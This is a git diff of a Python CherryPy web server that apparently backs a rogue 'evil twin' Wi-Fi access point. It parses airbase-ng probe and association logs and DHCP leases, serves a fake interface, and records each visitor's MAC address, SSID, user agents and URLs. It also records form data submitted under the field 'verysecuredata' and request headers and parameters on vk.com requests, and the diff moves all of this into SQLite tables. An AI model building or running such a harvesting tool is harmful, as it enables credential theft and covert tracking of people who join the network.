@@ -5,35 +5,80 @@ import os
 import re
 import threading
 import time
+import sqlite3
 from threading import Thread
 from time import sleep
 from mako.template import Template
 from mako.lookup import TemplateLookup
+from datetime import datetime,timedelta
+
 lookup = TemplateLookup(directories=['html'],default_filters=['decode.utf8'],input_encoding='utf-8',output_encoding='utf-8')
 clients = {}
 wireless = {}
 dataFormID = 'verysecuredata'
-infoLock = threading.Lock()
-wirelessLock = threading.Lock()
+wirelessLock = threading.RLock()
 cachedIndex = None
+tls = threading.local()
+session_interval = 3600 # 1 hour in seconds
 
-def getWireless(mac):
+def newClient():
+    new = {}
+    new['probes'] = set()    
+    new['agents'] = set()
+    new['urls'] = []
+    return new
+def getClientByMAC(mac,cursor):
+    if mac in wireless:
+        return wireless[mac]
     with wirelessLock:
         if mac in wireless:
             return wireless[mac]
-        new = {}
+        new = newClient()
+        new['mac'] = mac
         wireless[mac] = new
-        new['probes'] = set()
+        cursor.execute("SELECT ssid FROM clients WHERE mac=?",(mac,))
+        row = cursor.fetchone()
+        if row==None:
+            cursor.execute("INSERT into clients (mac) values (?)",(mac,))
+        else:
+            ssid = row[0]
+            if ssid is not None:
+                new['ssid'] = row[0]
         return new
-
-class HelloWorld(object):
-    def getInfo(self,testip):
-        with open("/var/lib/misc/dnsmasq.leases") as f:
-            for line in f:
-                (expire,mac,ip,name,mac2)=line.split()
-                if ip==testip:
-                    return {'mac':mac.upper(),'name':name}
-            return None
+def getClientByIP(ip,cursor):
+    if ip in clients:
+        print 'cached'
+        return clients[ip]
+    print "getClientsByIP",ip
+    with wirelessLock:
+        if ip in clients:
+            return clients[ip]
+        dhcp = getDhcpInfo(ip)
+        if dhcp is None:
+            mac = '00:00:00:00:00:00'
+            name = None
+        else:
+            mac = dhcp.get("mac",'00:00:00:00:00:00');
+            name = dhcp.get("name")
+        client = getClientByMAC(mac,cursor)
+        client['ip'] = ip
+        client['name'] = name
+        clients[ip]=client
+        cursor.execute("UPDATE clients SET name=?,ip=? WHERE mac=?",(name,ip,mac))
+        return client
+def getDhcpInfo(testip):
+    with open("/var/lib/misc/dnsmasq.leases") as f:
+        for line in f:
+            (expire,mac,ip,name,mac2)=line.split()
+            if ip==testip:
+                return {'mac':mac.upper(),'name':name}
+        return None
+def dict_factory(cursor, row):
+    d = {}
+    for idx, col in enumerate(cursor.description):
+        d[col[0]] = row[idx]
+    return d
+class Site(object):
     @cherrypy.expose
     def rawlog(self):
         with open ("/var/log/cherry_other.log", "r") as myfile:
@@ -42,14 +87,50 @@ class HelloWorld(object):
     @cherrypy.expose
     def mylog(self):
         tmpl = lookup.get_template("log.html")
-        sclients = sorted(clients.values(), key=lambda info: info['last'],reverse=True)
-        return tmpl.render(clients=sclients,wireless=wireless)
+        con = get_con(row_factory=dict_factory)
+        with con:
+            cursor = con.cursor()
+            stats = {}
+            now = datetime.now()
+            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL")
+            stats['ass_total'] = cursor.fetchone()['count']
+
+            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL AND last>?",(now-timedelta(hours=1),))
+            stats['ass_last_hour'] = cursor.fetchone()['count']
+
+            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL AND last>?",(now-timedelta(days=1),))
+            stats['ass_last_day'] = cursor.fetchone()['count']
+
+            cursor.execute("SELECT COUNT(*) as count FROM clients")
+            stats['probe_total'] = cursor.fetchone()['count']
+
+            cursor.execute("SELECT COUNT(*) as count FROM clients where last>?",(now-timedelta(hours=1),))
+            stats['probe_last_hour'] = cursor.fetchone()['count']
+
+            cursor.execute("SELECT COUNT(*) as count FROM clients WHERE last>?",(now-timedelta(days=1),))
+            stats['probe_last_day'] = cursor.fetchone()['count']
+
+
+            cursor.execute("SELECT * FROM clients WHERE ip IS NOT NULL ORDER BY last desc LIMIT 100")
+            clients = cursor.fetchall()
+            print stats
+            return tmpl.render(clients=clients,stats=stats)
     @cherrypy.expose
-    def mydetails(self, ip):
+    def mydetails(self, mac):
         tmpl = lookup.get_template("details.html")
-        if ip not in clients:
-            return "no data"
-        return tmpl.render(info=clients[ip])
+        con = get_con(row_factory=dict_factory)
+        with con:
+            cursor = con.cursor()
+            cursor.execute("SELECT * FROM clients WHERE mac=?",(mac,))
+            client = cursor.fetchone()
+            print client
+            if client is None:
+                return "no data"
+            cursor.execute("SELECT ssid FROM probes WHERE mac=?",(mac,))
+            probes = cursor.fetchall()
+            cursor.execute("SELECT agent FROM agents WHERE mac=?",(mac,))
+            agents = cursor.fetchall()
+            return tmpl.render(info=client,probes=probes,agents=agents)
     @cherrypy.expose
     def default(self,*args,**kwargs):
         start = time.time()
@@ -65,78 +146,227 @@ class HelloWorld(object):
         host = headers.get('Host')
         info = {}
         new = False        
-        if ip not in clients:
-            with infoLock:
-                # double check for waiting clients
-                if ip not in clients:
-                    result = self.getInfo(ip)
-                    new=True
-                    if result is None:
-                        result={'mac':'00:00:00:00:00:00'}
-                    result['ip']=ip
-                    result['urls'] = []
-                    result['wireless'] = getWireless(result['mac'])
-                    result['agents'] = set()
-                    clients[ip]=result
-        
-        info = clients[ip]
-        info['last']=time.time()
-        if agent is not None:
-            info['agents'] |= {agent}
-        mac=info['mac']
-        name=info.get('name')
-        ssid=info.get('ssid')
-        url = cherrypy.url()
-        info['urls'].append(url)
-
-        if 'vk.com' in  url:
-             cherrypy.log("vk %s" % (str(headers),))
-        if 'client.saw.fake.ui.jpg' in url:
-            cherrypy.log("client [%s,%s,%s,%s] saw fake UI" % (mac,name,ip,ssid))
-            info['saw'] = True
-            return ""
-        if new:
-            cherrypy.log("client '%s' %s %s %s %s" % (ssid,mac,name,ip,agent))
-        if (dataFormID in kwargs):
-          data=kwargs[dataFormID]
-          info['data']=data
-          cherrypy.log("submit: [%s,%s,%s,%s]->%s,agent %s,DATA %s" % (ip,mac,name,ssid,url,agent,data))        
+        con = get_con()
+        with con:
+            cursor = con.cursor()
+            client = getClientByIP(ip,cursor)
+            updateLastSeen(client,cursor)
+            mac=client['mac']
+            name=client.get('name')
+            ssid=client.get('ssid')
+            agents = client['agents']
+            if agent is not None and agent not in agents:
+                cursor.execute("INSERT OR IGNORE INTO agents (mac,agent)  VALUES (?,?)",(mac,agent))
+                print 'add agent'
+                agents |= {agent}
+            url = cherrypy.url()
+            client['urls'].append(url)
+            cherrypy.log("!!URL!!%s!!%s" % (mac,url))
+            if 'vk.com' in  url:
+                cherrypy.log("vk: %s" % (str(headers),))
+                cherrypy.log("vk data: %s" % (str(kwargs),))
+            if 'client.saw.fake.ui.jpg' in url:
+                cherrypy.log("client [%s,%s,%s,%s] saw fake UI" % (mac,name,ip,ssid))
+                if 'saw' not in client or not client['saw']:
+                    client['saw'] = True
+                    print 'saw'
+                    cursor.execute("UPDATE clients SET saw=? WHERE mac=?",(1,mac))
+                return ""
+#        if new:
+#            cherrypy.log("client '%s' %s %s %s %s" % (ssid,mac,name,ip,agent))
+            if (dataFormID in kwargs):
+                data=kwargs[dataFormID]
+                client['data']=data
+                cherrypy.log("submit: [%s,%s,%s,%s]->%s,agent %s,DATA %s" % (ip,mac,name,ssid,url,agent,data))        
+                cursor.execute("UPDATE clients SET data=? WHERE mac=?",(data,mac))
+                print 'data'
         return cachedIndex
 def follow(thefile):
-    #thefile.seek(0,2)
+    thefile.seek(0,2)
     while True:
         line = thefile.readline()
         if not line:
             time.sleep(0.1)
             continue
         yield line
+
+def newSession(cursor,mac,time):
+    session = {}
+    cursor.execute("INSERT INTO sessions (mac,first,last) VALUES (?,?,?)",(mac,time,time))
+    print "new session ",cursor.lastrowid,"-",mac,"-",time
+    session['id'] = cursor.lastrowid
+    session['first'] = time
+    session['last'] = time
+    session['timer'] = None
+    return session
+def saveSession(client,cursor):
+    session = client['session']
+    last = session['last']
+    mac = client['mac']
+    print "save session ",session['id'],"-",mac,"-",last
+    cursor.execute("UPDATE sessions SET last=? WHERE id=?",(last,session['id']))
+    cursor.execute("UPDATE clients SET last=? WHERE mac=?",(last,mac))
+
+
+updateDict = {}
+updateLock = threading.RLock()
+updateTimer = None
+
+def updateClients():
+    global updateTimer,updateDict
+    start = time.time()
+    print "START !!!!!!!!!delayed save!!!!!!!"
+    with updateLock:
+        con = get_con()
+        with con:
+            cursor = con.cursor()
+            for mac,client in updateDict.iteritems():
+                saveSession(client,cursor)
+            updateDict = {}
+            updateTimer = None
+    end = time.time()
+    print "measure updateClients",end - start
+    print "END !!!!!!!!!delayed save!!!!!!!"
+
+def updateLastSeen(client,cursor):
+    global updateTimer,updateDict
+    now = datetime.now()
+    mac = client['mac']
+    if 'session' not in client:
+ #       print "session is not in client"
+        cursor.execute("SELECT id,first,last,mac from sessions WHERE mac=? ORDER BY last DESC LIMIT 1",(mac,))
+        last_session = cursor.fetchone()
+        if last_session is None:
+            client['session'] = newSession(cursor,mac,now)
+            saveSession(client,cursor)
+        else:
+#            print "last",last_session
+            session = {}
+            session['id'] = last_session[0]
+            session['first'] = last_session[1]
+            session['last'] = last_session[2]
+            session['timer'] = None
+            client['session'] = session
+    session = client['session']
+    if (now-session['last']).total_seconds()>session_interval:
+        print "INTERVAL EXCEEDED;NEW SESSION"
+        saveSession(client,cursor)
+        client['session'] = newSession(cursor,mac,now)
+        saveSession(client,cursor)
+    elif now>session['last']:
+        client['last'] = now
+        session['last'] = now
+        with updateLock:
+#            print "update client ",mac," with delay"
+            updateDict[mac] = client
+            if updateTimer is None:
+                updateTimer = threading.Timer(30, updateClients)
+                updateTimer.start()
+
+        #saveSession(client,cursor)
+        
+"""
+        start = time.time()
+        result= self.default_body(*args,**kwargs)
+        end = time.time()
+        print "measure",end - start
+        return result
+
+"""
 def airbaseReader():
     logfile = open("/var/log/airbase.log","r")
     probe=re.compile('directed probe request from ([a-f0-9:]+)\s+-\s+"(.*)"',re.IGNORECASE);
     assoc=re.compile('client\s+([a-f0-9:]+)\s+(?:re)?associated.*ESSID:\s+"(.*)"',re.IGNORECASE);
+    con = get_con()
     for line in follow(logfile):
         m = probe.search(line)
         if m:
           mac = m.group(1).upper()
           ssid = m.group(2)
-          w = getWireless(mac)
-          w['probes'] |= {ssid}
+          with con:
+#              start = time.time()
+              cursor = con.cursor()
+              w = getClientByMAC(mac,cursor)
+              probes = w['probes']
+              if ssid not in probes:
+                  cursor.execute("INSERT OR IGNORE INTO probes (mac,ssid)  VALUES (?,?)",(mac,ssid))
+                  probes |= {ssid}
+              updateLastSeen(w,cursor)
+#          end = time.time()
+#          print "measure airbase probe",end - start
+
         else:
           m = assoc.search(line)
           if m:
               mac = m.group(1).upper()
               ssid = m.group(2)
-              w = getWireless(mac)
-              w['ssid']=ssid              
+#              start = time.time()
+              with con:
+                  cursor = con.cursor()
+                  w = getClientByMAC(mac,cursor)
+                  if 'ssid' not in w or w['ssid'] != ssid:
+                      cursor.execute("UPDATE clients SET ssid=? WHERE mac=?",(ssid,mac))
+                      w['ssid'] = ssid
+                  updateLastSeen(w,cursor)
+#              end = time.time()
+#              print "measure airbase assoc",end - start
+
+def create_db():
+    con = get_con()
+    c = con.cursor()
+    c.execute("""create table clients (
+           mac char(17) UNIQUE ON CONFLICT FAIL,
+           ip varchar(255),
+           saw integer DEFAULT 0,
+           data text,
+           name varchar(255),
+           added timestamp DEFAULT CURRENT_TIMESTAMP,
+           last timestamp  DEFAULT CURRENT_TIMESTAMP,
+           ssid varchar(255))""")
+    c.execute("""create table probes (mac char(17),ssid varchar(255),added timestamp DEFAULT CURRENT_TIMESTAMP)""")
+    c.execute("""create unique index probes_index ON probes (mac,ssid)""")
+    c.execute("""create table agents (mac char(17),agent text,added timestamp DEFAULT CURRENT_TIMESTAMP)""")
+    c.execute("""create unique index agents_index ON agents (mac,agent)""")
+    c.execute("""create table sessions (id INTEGER PRIMARY KEY AUTOINCREMENT,mac char(17),first timestamp,last timestamp)""")
+
+def setup_con(con,row_factory):
+    con.row_factory = sqlite3.Row
+    if row_factory is not None:
+        con.row_factory = row_factory
+    con.text_factory = str
+def connect_db():
+    con = sqlite3.connect('clients.db',detect_types=sqlite3.PARSE_DECLTYPES)
+    return con
+
+def get_con(row_factory=None):
+    global tls
+    try:
+        setup_con(tls.con,row_factory)
+        return tls.con
+    except:
+        tls.con = connect_db()
+        setup_con(tls.con,row_factory)
+        return tls.con
+def init_db():
+    con = get_con()
+    c = con.cursor()
+
+    try:
+        c.execute("SELECT * from clients LIMIT 1")
+    except:
+        create_db()
+
 if __name__ == '__main__':
    cherrypy.server.socket_host = "0.0.0.0"
    cherrypy.server.socket_port = 80
    cherrypy.log.access_file="/var/log/cherry_access.log"
    cherrypy.log.error_file="/var/log/cherry_other.log"
    tmpl = lookup.get_template("index.html")
+   init_db()
    thread = Thread(target = airbaseReader)
    thread.daemon = True
    thread.start()
+
    cachedIndex = tmpl.render()
    conf = {
          '/': {
@@ -149,4 +379,4 @@ if __name__ == '__main__':
              'tools.staticdir.dir': './static'
          }
      }
-   cherrypy.quickstart(HelloWorld(),'/',conf)
+   cherrypy.quickstart(Site(),'/',conf)
